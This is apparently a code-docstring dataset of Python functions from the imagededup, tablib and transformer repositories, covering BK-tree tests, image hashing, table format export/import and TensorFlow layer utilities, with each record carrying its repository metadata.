{"docstring": "# Input a complete tree and check for each node the children and parents\n", "func_signal": "def test_construct_tree():\n", "code": "hash_dict, dist_func = initialize_for_bktree()\nbk = BKTree(hash_dict, dist_func)\n# check root\nassert bk.ROOT == 'a'\n# check that expected leaf nodes have no children (they're actually leaf nodes)\nleaf_nodes = set(\n    [k for k in bk.dict_all.keys() if len(bk.dict_all[k].children) == 0]\n)\nexpected_leaf_nodes = set(['b', 'd', 'f', 'h'])\nassert leaf_nodes == expected_leaf_nodes\n# check that root node ('a') has 4 children\nassert len(bk.dict_all[bk.ROOT].children) == 4\n# check that 'c' has 'd' as it's child at distance 2\nassert bk.dict_all['c'].children['d'] == 2", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Input a tree and send a search query, check whether correct retrievals are returned\n", "func_signal": "def test_search_correctness():\n", "code": "hash_dict, dist_func = initialize_for_bktree()\nbk = BKTree(hash_dict, dist_func)\nquery = '5'\nvalid_retrievals = bk.search(query, tol=2)\nassert set([i[0] for i in valid_retrievals]) == set(['a', 'f', 'g', 'd', 'b'])", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Input a tree and send a search query, check whether zero retrievals are returned for zero tolerance\n", "func_signal": "def test_search_zero_tolerance():\n", "code": "hash_dict, dist_func = initialize_for_bktree()\nbk = BKTree(hash_dict, dist_func)\nquery = '5'\nvalid_retrievals = bk.search(query, tol=0)\nassert len(valid_retrievals) == 0", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Rotate image slightly (1 degree) and check that hamming distance between hashes is not too large\n", "func_signal": "def test_hash_small_rotation(self, hash_function):\n", "code": "orig_image = Image.open(PATH_SINGLE_IMAGE)\nrotated_image = np.array(orig_image.rotate(1))\nhash_im_1 = hash_function(image_array=np.array(orig_image))\nhash_im_2 = hash_function(image_array=rotated_image)\nhamdist = Hashing.hamming_distance(hash_im_1, hash_im_2)\nassert hamdist < 3", "path": "imagededup/tests/test_hashing.py", "commit_date": "2020-10-19 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# initialize root node, add 1 new node and enter another node with different distance from root, check that the\n# distance recorded in the root's children dictionary is as expected\n", "func_signal": "def test_insert_tree_check_distance():\n", "code": "_, dist_func = initialize_for_bktree()\nhash_dict = OrderedDict(\n    {'a': '9', 'b': 'D', 'c': 'F'}\n)  # to guarantee that 'a' is the root of the tree\nbk = BKTree(hash_dict, dist_func)\nassert bk.ROOT == 'a'\nassert bk.dict_all[bk.ROOT].children['b'] == 1\nassert bk.dict_all[bk.ROOT].children['c'] == 2", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Resize one image to (300, 300) and check that hamming distance between hashes is not too large\n", "func_signal": "def test_hash_resize(self, hash_function):\n", "code": "hash_im_1 = hash_function(PATH_SINGLE_IMAGE)\nhash_im_2 = hash_function(PATH_SINGLE_IMAGE_RESIZED)\nhamdist = Hashing.hamming_distance(hash_im_1, hash_im_2)\nassert hamdist < 3", "path": "imagededup/tests/test_hashing.py", "commit_date": "2020-10-19 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# initialize root node, add 1 new node and enter another node with same distance from root, check it goes not as\n# root's child but the other node's child\n", "func_signal": "def test_insert_tree_collision():\n", "code": "_, dist_func = initialize_for_bktree()\nhash_dict = OrderedDict(\n    {'a': '9', 'b': 'D', 'c': '8'}\n)  # to guarantee that 'a' is the root of the tree\nbk = BKTree(hash_dict, dist_func)\nassert bk.ROOT == 'a'\nassert len(bk.dict_all[bk.ROOT].children) == 1\nassert 'c' in list(bk.dict_all['b'].children.keys())", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Input a tree and send a search query, check whether correct number of retrievals are returned\n", "func_signal": "def test_search():\n", "code": "hash_dict, dist_func = initialize_for_bktree()\nbk = BKTree(hash_dict, dist_func)\nquery = '5'\nvalid_retrievals = bk.search(query, tol=2)\nassert len(valid_retrievals) == 5", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Give a partial tree as input and check that for a query, increased tolerance gives more retrievals as expected for\n# the input tree\n", "func_signal": "def test_tolerance_affects_retrievals():\n", "code": "hash_dict, dist_func = initialize_for_bktree()\nbk = BKTree(hash_dict, dist_func)\nassert bk.ROOT == 'a'\nquery = '5'\ncandidates, _, _ = bk._get_next_candidates(query, bk.dict_all[bk.ROOT], tolerance=1)\nlow_tolerance_candidate_len = len(candidates)\ncandidates, _, _ = bk._get_next_candidates(query, bk.dict_all[bk.ROOT], tolerance=2)\nhigh_tolerance_candidate_len = len(candidates)\nassert high_tolerance_candidate_len > low_tolerance_candidate_len", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "\"\"\"\nGet perceptual hash of the input image.\n\nArgs:\n    image_array: numpy array that corresponds to the image.\n\nReturns:\n    A string representing the perceptual hash of the image.\n\"\"\"\n", "func_signal": "def _hash_algo(self, image_array):\n", "code": "dct_coef = dct(dct(image_array, axis=0), axis=1)\n\n# retain top left 8 by 8 dct coefficients\ndct_reduced_coef = dct_coef[\n    : self.__coefficient_extract[0], : self.__coefficient_extract[1]\n]\n\n# median of coefficients excluding the DC term (0th term)\n# mean_coef_val = np.mean(np.ndarray.flatten(dct_reduced_coef)[1:])\nmedian_coef_val = np.median(np.ndarray.flatten(dct_reduced_coef)[1:])\n\n# return mask of all coefficients greater than mean of coefficients\nhash_mat = dct_reduced_coef >= median_coef_val\nreturn hash_mat", "path": "imagededup/imagededup/methods/hashing.py", "commit_date": "2020-10-19 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Input a tree and send a search query, check whether correct distance for a retrieval is returned\n", "func_signal": "def test_search_dist():\n", "code": "hash_dict, dist_func = initialize_for_bktree()\nbk = BKTree(hash_dict, dist_func)\nquery = '5'\nvalid_retrievals = bk.search(query, tol=2)\nassert [i for i in valid_retrievals if i[0] == 'a'][0][1] == 2", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Put two numbers and check if hamming distance is correct\n", "func_signal": "def test_hamming_distance(hasher):\n", "code": "number_1 = '1a'\nnumber_2 = '1f'\nhamdist = hasher.hamming_distance(number_1, number_2)\nassert hamdist == 2", "path": "imagededup/tests/test_hashing.py", "commit_date": "2020-10-19 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "\"\"\"\nGet difference hash of the input image.\n\nArgs:\n    image_array: numpy array that corresponds to the image.\n\nReturns:\n    A string representing the difference hash of the image.\n\"\"\"\n# Calculates difference between consecutive columns and return mask\n", "func_signal": "def _hash_algo(self, image_array):\n", "code": "hash_mat = image_array[:, 1:] > image_array[:, :-1]\nreturn hash_mat", "path": "imagededup/imagededup/methods/hashing.py", "commit_date": "2020-10-19 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Give a partial tree as input and check that for a query, expected candidates and validity flag are obtained\n", "func_signal": "def test_get_next_candidates_valid():\n", "code": "hash_dict, dist_func = initialize_for_bktree()\nbk = BKTree(hash_dict, dist_func)\nassert bk.ROOT == 'a'\nquery = '5'\ncandidates, validity, dist = bk._get_next_candidates(\n    query, bk.dict_all[bk.ROOT], tolerance=2\n)\ncandidates = set(candidates)\nassert candidates <= set(['b', 'c', 'e', 'f'])\nassert validity", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# initialize root node, add 1 new node and enter another node with different distance from root, check it goes as\n# root's child and not as the other node's child\n", "func_signal": "def test_insert_tree_different_nodes():\n", "code": "_, dist_func = initialize_for_bktree()\nhash_dict = OrderedDict(\n    {'a': '9', 'b': 'D', 'c': 'F'}\n)  # to guarantee that 'a' is the root of the tree\nbk = BKTree(hash_dict, dist_func)\nassert bk.ROOT == 'a'\nassert len(bk.dict_all[bk.ROOT].children) == 2\nassert set(['b', 'c']) <= set(bk.dict_all[bk.ROOT].children.keys())", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# Put in distinct images and check that hamming distance between hashes is large\n", "func_signal": "def test_hash_distinct_images(self, hash_function):\n", "code": "hash_im_1 = hash_function(PATH_SINGLE_IMAGE)\nhash_im_2 = hash_function(p.parent / 'data/mixed_images/ukbench09268.jpg')\nhamdist = Hashing.hamming_distance(hash_im_1, hash_im_2)\nassert hamdist > 20", "path": "imagededup/tests/test_hashing.py", "commit_date": "2020-10-19 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "\"\"\"\nGet wavelet hash of the input image.\n\nArgs:\n    image_array: numpy array that corresponds to the image.\n\nReturns:\n    A string representing the wavelet hash of the image.\n\"\"\"\n# decomposition level set to 5 to get 8 by 8 hash matrix\n", "func_signal": "def _hash_algo(self, image_array):\n", "code": "image_array = image_array / 255\ncoeffs = pywt.wavedec2(data=image_array, wavelet=self.__wavelet_func, level=5)\nLL_coeff = coeffs[0]\n\n# median of LL coefficients\nmedian_coef_val = np.median(np.ndarray.flatten(LL_coeff))\n\n# return mask of all coefficients greater than mean of coefficients\nhash_mat = LL_coeff >= median_coef_val\nreturn hash_mat", "path": "imagededup/imagededup/methods/hashing.py", "commit_date": "2020-10-19 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "\"\"\"\nGenerate hashes for all images in a given directory of images.\n\nArgs:\n    image_dir: Path to the image directory.\n\nReturns:\n    dictionary: A dictionary that contains a mapping of filenames and corresponding 64 character hash string\n                such as {'Image1.jpg': 'hash_string1', 'Image2.jpg': 'hash_string2', ...}\n\nExample:\n```\nfrom imagededup.methods import <hash-method>\nmyencoder = <hash-method>()\nmapping = myencoder.encode_images('path/to/directory')\n```\n\"\"\"\n", "func_signal": "def encode_images(self, image_dir=None):\n", "code": "if not os.path.isdir(image_dir):\n    raise ValueError('Please provide a valid directory path!')\n\nimage_dir = Path(image_dir)\n\nfiles = [\n    i.absolute() for i in image_dir.glob('*') if not i.name.startswith('.')\n]  # ignore hidden files\n\nlogger.info(f'Start: Calculating hashes...')\n\nhashes = parallelise(self.encode_image, files, self.verbose)\nhash_initial_dict = dict(zip([f.name for f in files], hashes))\nhash_dict = {\n    k: v for k, v in hash_initial_dict.items() if v\n}  # To ignore None (returned if some probelm with image file)\n\nlogger.info(f'End: Calculating hashes!')\nreturn hash_dict", "path": "imagededup/imagededup/methods/hashing.py", "commit_date": "2020-10-19 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "\"\"\"Completes given worksheet from given Dataset.\"\"\"\n", "func_signal": "def dset_sheet(cls, dataset, ws):\n", "code": "_package = dataset._package(dicts=False)\n\nfor i, sep in enumerate(dataset._separators):\n    _offset = i\n    _package.insert((sep[0] + _offset), (sep[1],))\n\nfor i, row in enumerate(_package):\n    for j, col in enumerate(row):\n\n        # bold headers\n        if (i == 0) and dataset.headers:\n            ws.write(i, j, col, bold)\n\n            # frozen header row\n            ws.panes_frozen = True\n            ws.horz_split_pos = 1\n\n        # bold separators\n        elif len(row) < dataset.width:\n            ws.write(i, j, col, bold)\n\n        # wrap the rest\n        else:\n            try:\n                if '\\n' in col:\n                    ws.write(i, j, col, wrap)\n                else:\n                    ws.write(i, j, col)\n            except TypeError:\n                ws.write(i, j, col)", "path": "tablib/src/tablib/formats/_xls.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns databook from XLS stream.\"\"\"\n\n", "func_signal": "def import_set(cls, dset, in_stream, headers=True):\n", "code": "dset.wipe()\n\nxls_book = xlrd.open_workbook(file_contents=in_stream.read())\nsheet = xls_book.sheet_by_index(0)\n\ndset.title = sheet.name\n\ndef cell_value(value, type_):\n    if type_ == xlrd.XL_CELL_ERROR:\n        return xlrd.error_text_from_code[value]\n    elif type_ == xlrd.XL_CELL_DATE:\n        return xldate_as_datetime(value, xls_book.datemode)\n    return value\n\nfor i in range(sheet.nrows):\n    if i == 0 and headers:\n        dset.headers = sheet.row_values(0)\n    else:\n        dset.append([\n            cell_value(val, typ)\n            for val, typ in zip(sheet.row_values(i), sheet.row_types(i))\n        ])", "path": "tablib/src/tablib/formats/_xls.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"\nReturns reStructuredText grid table representation of dataset.\n\n\n>>> from tablib import Dataset\n>>> from tablib.formats import registry\n>>> bits = ((0, 0), (1, 0), (0, 1), (1, 1))\n>>> data = Dataset()\n>>> data.headers = ['A', 'B', 'A and B']\n>>> for a, b in bits:\n...     data.append([bool(a), bool(b), bool(a * b)])\n>>> rst = registry.get_format('rst')\n>>> print(rst.export_set(data, force_grid=True))\n+-------+-------+-------+\n|   A   |   B   | A and |\n|       |       |   B   |\n+=======+=======+=======+\n| False | False | False |\n+-------+-------+-------+\n| True  | False | False |\n+-------+-------+-------+\n| False | True  | False |\n+-------+-------+-------+\n| True  | True  | True  |\n+-------+-------+-------+\n\n\"\"\"\n", "func_signal": "def export_set_as_grid_table(cls, dataset, column_widths=None):\n", "code": "lines = []\nwrapper = TextWrapper()\nif column_widths is None:\n    column_widths = cls._get_column_widths(dataset)\nheader_sep = '+=' + '=+='.join(['=' * w for w in column_widths]) + '=+'\nrow_sep = '+-' + '-+-'.join(['-' * w for w in column_widths]) + '-+'\n\nlines.append(row_sep)\n\nif dataset.headers:\n    lines.extend(cls._row_to_lines(\n        dataset.headers,\n        column_widths,\n        wrapper,\n        justify=JUSTIFY_CENTER,\n    ))\n    lines.append(header_sep)\nfor row in dataset.dict:\n    values = iter(row.values() if hasattr(row, 'values') else row)\n    lines.extend(cls._row_to_lines(values, column_widths, wrapper))\n    lines.append(row_sep)\nreturn '\\n'.join(lines)", "path": "tablib/src/tablib/formats/_rst.py", "commit_date": "2020-06-15 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns XLS representation of Dataset.\"\"\"\n\n", "func_signal": "def export_set(cls, dataset):\n", "code": "wb = xlwt.Workbook(encoding='utf8')\nws = wb.add_sheet(dataset.title if dataset.title else 'Tablib Dataset')\n\ncls.dset_sheet(dataset, ws)\n\nstream = BytesIO()\nwb.save(stream)\nreturn stream.getvalue()", "path": "tablib/src/tablib/formats/_xls.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns string representation of a single row.\n\n:param row: single dataset row\n\"\"\"\n\n", "func_signal": "def _serialize_row(cls, row):\n", "code": "new_row = [cls._escape_tex_reserved_symbols(str(item)) if item else ''\n           for item in row]\nreturn 6 * ' ' + ' & '.join(new_row) + ' \\\\\\\\'", "path": "tablib/src/tablib/formats/_latex.py", "commit_date": "2019-11-02 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"\nReturns reStructuredText grid table representation of dataset.\n\"\"\"\n", "func_signal": "def export_set_as_simple_table(cls, dataset, column_widths=None):\n", "code": "lines = []\nwrapper = TextWrapper()\nif column_widths is None:\n    column_widths = cls._get_column_widths(dataset, pad_len=2)\nborder = '  '.join(['=' * w for w in column_widths])\n\nlines.append(border)\nif dataset.headers:\n    lines.extend(cls._row_to_lines(\n        dataset.headers,\n        column_widths,\n        wrapper,\n        sep='',\n        justify=JUSTIFY_CENTER,\n    ))\n    lines.append(border)\nfor row in dataset.dict:\n    values = iter(row.values() if hasattr(row, 'values') else row)\n    lines.extend(cls._row_to_lines(values, column_widths, wrapper, ''))\nlines.append(border)\nreturn '\\n'.join(lines)", "path": "tablib/src/tablib/formats/_rst.py", "commit_date": "2020-06-15 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"\nReturns a list of string lengths of each column, and a list of\nmaximum word lengths.\n\"\"\"\n", "func_signal": "def _get_column_string_lengths(cls, dataset):\n", "code": "if dataset.headers:\n    column_lengths = [[len(h)] for h in dataset.headers]\n    word_lens = [_max_word_len(h) for h in dataset.headers]\nelse:\n    column_lengths = [[] for _ in range(dataset.width)]\n    word_lens = [0 for _ in range(dataset.width)]\nfor row in dataset.dict:\n    values = iter(row.values() if hasattr(row, 'values') else row)\n    for i, val in enumerate(values):\n        text = to_str(val)\n        column_lengths[i].append(len(text))\n        word_lens[i] = max(word_lens[i], _max_word_len(text))\nreturn column_lengths, word_lens", "path": "tablib/src/tablib/formats/_rst.py", "commit_date": "2020-06-15 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns JSON representation of Databook.\"\"\"\n", "func_signal": "def export_book(cls, databook):\n", "code": "return json.dumps(\n    databook._package(), default=serialize_objects_handler, ensure_ascii=False\n)", "path": "tablib/src/tablib/formats/_json.py", "commit_date": "2020-12-05 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"\nReturns a list of column widths proportional to the median length\nof the text in their cells.\n\"\"\"\n", "func_signal": "def _get_column_widths(cls, dataset, max_table_width=MAX_TABLE_WIDTH, pad_len=3):\n", "code": "str_lens, word_lens = cls._get_column_string_lengths(dataset)\nmedian_lens = [int(median(lens)) for lens in str_lens]\ntotal = sum(median_lens)\nif total > max_table_width - (pad_len * len(median_lens)):\n    column_widths = (max_table_width * l // total for l in median_lens)\nelse:\n    column_widths = (l for l in median_lens)\n# Allow for separator and padding:\ncolumn_widths = (w - pad_len if w > pad_len else w for w in column_widths)\n# Rather widen table than break words:\ncolumn_widths = [max(w, l) for w, l in zip(column_widths, word_lens)]\nreturn column_widths", "path": "tablib/src/tablib/formats/_rst.py", "commit_date": "2020-06-15 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"\nreStructuredText representation of a Databook.\n\nTables are separated by a blank line. All tables use the grid\nformat.\n\"\"\"\n", "func_signal": "def export_book(cls, databook):\n", "code": "return '\\n\\n'.join(cls.export_set(dataset, force_grid=True)\n                   for dataset in databook._datasets)", "path": "tablib/src/tablib/formats/_rst.py", "commit_date": "2020-06-15 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"\nReturns a table row of wrapped values as a list of lines\n\"\"\"\n", "func_signal": "def _row_to_lines(cls, values, widths, wrapper, sep='|', justify=JUSTIFY_LEFT):\n", "code": "if justify not in JUSTIFY_VALUES:\n    raise ValueError('Value of \"justify\" must be one of \"{}\"'.format(\n        '\", \"'.join(JUSTIFY_VALUES)\n    ))\nif justify == JUSTIFY_LEFT:\n    just = lambda text, width: text.ljust(width)\nelif justify == JUSTIFY_CENTER:\n    just = lambda text, width: text.center(width)\nelse:\n    just = lambda text, width: text.rjust(width)\nlpad = sep + ' ' if sep else ''\nrpad = ' ' + sep if sep else ''\npad = ' ' + sep + ' '\ncells = []\nfor value, width in zip(values, widths):\n    wrapper.width = width\n    text = to_str(value)\n    cell = wrapper.wrap(text)\n    cells.append(cell)\nlines = zip_longest(*cells, fillvalue='')\nlines = (\n    (just(cell_line, widths[i]) for i, cell_line in enumerate(line))\n    for line in lines\n)\nlines = [''.join((lpad, pad.join(line), rpad)) for line in lines]\nreturn lines", "path": "tablib/src/tablib/formats/_rst.py", "commit_date": "2020-06-15 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns LaTeX representation of dataset\n\n:param dataset: dataset to serialize\n:type dataset: tablib.core.Dataset\n\"\"\"\n\n", "func_signal": "def export_set(cls, dataset):\n", "code": "caption = '\\\\caption{%s}' % dataset.title if dataset.title else '%'\ncolspec = cls._colspec(dataset.width)\nheader = cls._serialize_row(dataset.headers) if dataset.headers else ''\nmidrule = cls._midrule(dataset.width)\nbody = '\\n'.join([cls._serialize_row(row) for row in dataset])\nreturn cls.TABLE_TEMPLATE % dict(CAPTION=caption, COLSPEC=colspec,\n                             HEADER=header, MIDRULE=midrule, BODY=body)", "path": "tablib/src/tablib/formats/_latex.py", "commit_date": "2019-11-02 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns databook from XLS stream.\"\"\"\n\n", "func_signal": "def import_book(cls, dbook, in_stream, headers=True):\n", "code": "dbook.wipe()\n\nxls_book = xlrd.open_workbook(file_contents=in_stream)\n\nfor sheet in xls_book.sheets():\n    data = tablib.Dataset()\n    data.title = sheet.name\n\n    for i in range(sheet.nrows):\n        if i == 0 and headers:\n            data.headers = sheet.row_values(0)\n        else:\n            data.append(sheet.row_values(i))\n\n    dbook.add_sheet(data)", "path": "tablib/src/tablib/formats/_xls.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns True if given stream is a readable excel file.\"\"\"\n", "func_signal": "def detect(cls, stream):\n", "code": "try:\n    xlrd.open_workbook(file_contents=stream)\n    return True\nexcept Exception:\n    pass\ntry:\n    xlrd.open_workbook(file_contents=stream.read())\n    return True\nexcept Exception:\n    pass\ntry:\n    xlrd.open_workbook(filename=stream)\n    return True\nexcept Exception:\n    return False", "path": "tablib/src/tablib/formats/_xls.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns JSON representation of Dataset.\"\"\"\n", "func_signal": "def export_set(cls, dataset):\n", "code": "return json.dumps(\n    dataset.dict, default=serialize_objects_handler, ensure_ascii=False\n)", "path": "tablib/src/tablib/formats/_json.py", "commit_date": "2020-12-05 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"\nAccept either a str/bytes stream or a file-like object and always return a\nfile-like object.\n\"\"\"\n", "func_signal": "def normalize_input(stream):\n", "code": "if isinstance(stream, str):\n    return StringIO(stream)\nelif isinstance(stream, bytes):\n    return BytesIO(stream)\nreturn stream", "path": "tablib/src/tablib/utils.py", "commit_date": "2020-01-11 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"\nReturns reStructuredText table representation of dataset.\n\nReturns a simple table if the text in the first column is never\nwrapped, otherwise returns a grid table.\n\n\n>>> from tablib import Dataset\n>>> bits = ((0, 0), (1, 0), (0, 1), (1, 1))\n>>> data = Dataset()\n>>> data.headers = ['A', 'B', 'A and B']\n>>> for a, b in bits:\n...     data.append([bool(a), bool(b), bool(a * b)])\n>>> table = data.rst\n>>> table.split('\\\\n') == [\n...     '=====  =====  =====',\n...     '  A      B    A and',\n...     '                B  ',\n...     '=====  =====  =====',\n...     'False  False  False',\n...     'True   False  False',\n...     'False  True   False',\n...     'True   True   True ',\n...     '=====  =====  =====',\n... ]\nTrue\n\n\"\"\"\n", "func_signal": "def export_set(cls, dataset, **kwargs):\n", "code": "if not dataset.dict:\n    return ''\nforce_grid = kwargs.get('force_grid', False)\nmax_table_width = kwargs.get('max_table_width', cls.MAX_TABLE_WIDTH)\ncolumn_widths = cls._get_column_widths(dataset, max_table_width)\n\nuse_simple_table = cls._use_simple_table(\n    dataset.headers[0] if dataset.headers else None,\n    dataset.get_col(0),\n    column_widths[0],\n)\nif use_simple_table and not force_grid:\n    return cls.export_set_as_simple_table(dataset, column_widths)\nelse:\n    return cls.export_set_as_grid_table(dataset, column_widths)", "path": "tablib/src/tablib/formats/_rst.py", "commit_date": "2020-06-15 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns dataset from JSON stream.\"\"\"\n\n", "func_signal": "def import_set(cls, dset, in_stream):\n", "code": "dset.wipe()\ndset.dict = json.load(in_stream)", "path": "tablib/src/tablib/formats/_json.py", "commit_date": "2020-12-05 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns XLS representation of DataBook.\"\"\"\n\n", "func_signal": "def export_book(cls, databook):\n", "code": "wb = xlwt.Workbook(encoding='utf8')\n\nfor i, dset in enumerate(databook._datasets):\n    ws = wb.add_sheet(dset.title if dset.title else 'Sheet%s' % (i))\n\n    cls.dset_sheet(dset, ws)\n\nstream = BytesIO()\nwb.save(stream)\nreturn stream.getvalue()", "path": "tablib/src/tablib/formats/_xls.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "\"\"\"Returns databook from JSON stream.\"\"\"\n\n", "func_signal": "def import_book(cls, dbook, in_stream):\n", "code": "dbook.wipe()\nfor sheet in json.load(in_stream):\n    data = tablib.Dataset()\n    data.title = sheet['title']\n    data.dict = sheet['data']\n    dbook.add_sheet(data)", "path": "tablib/src/tablib/formats/_json.py", "commit_date": "2020-12-05 00:00:00", "repo_name": "jazzband/tablib", "stars": 4496, "license": "mit", "language": "python", "size": 2063}
{"docstring": "'''position-wise feed forward net. See 3.3\n\ninputs: A 3d tensor with shape of [N, T, C].\nnum_units: A list of two integers.\nscope: Optional scope for `variable_scope`.\n\nReturns:\n  A 3d tensor with the same shape and dtype as inputs\n'''\n", "func_signal": "def ff(inputs, num_units, scope=\"positionwise_feedforward\"):\n", "code": "with tf.variable_scope(scope, reuse=tf.AUTO_REUSE):\n    # Inner layer\n    outputs = tf.layers.dense(inputs, num_units[0], activation=tf.nn.relu)\n\n    # Outer layer\n    outputs = tf.layers.dense(outputs, num_units[1])\n\n    # Residual connection\n    outputs += inputs\n    \n    # Normalize\n    outputs = ln(outputs)\n\nreturn outputs", "path": "transformer/modules.py", "commit_date": "2019-09-24 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Applies layer normalization. See https://arxiv.org/abs/1607.06450.\ninputs: A tensor with 2 or more dimensions, where the first dimension has `batch_size`.\nepsilon: A floating number. A very small number for preventing ZeroDivision Error.\nscope: Optional scope for `variable_scope`.\n  \nReturns:\n  A tensor with the same shape and data dtype as `inputs`.\n'''\n", "func_signal": "def ln(inputs, epsilon = 1e-8, scope=\"ln\"):\n", "code": "with tf.variable_scope(scope, reuse=tf.AUTO_REUSE):\n    inputs_shape = inputs.get_shape()\n    params_shape = inputs_shape[-1:]\n\n    mean, variance = tf.nn.moments(inputs, [-1], keep_dims=True)\n    beta= tf.get_variable(\"beta\", params_shape, initializer=tf.zeros_initializer())\n    gamma = tf.get_variable(\"gamma\", params_shape, initializer=tf.ones_initializer())\n    normalized = (inputs - mean) / ( (variance + epsilon) ** (.5) )\n    outputs = gamma * normalized + beta\n    \nreturn outputs", "path": "transformer/modules.py", "commit_date": "2019-09-24 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
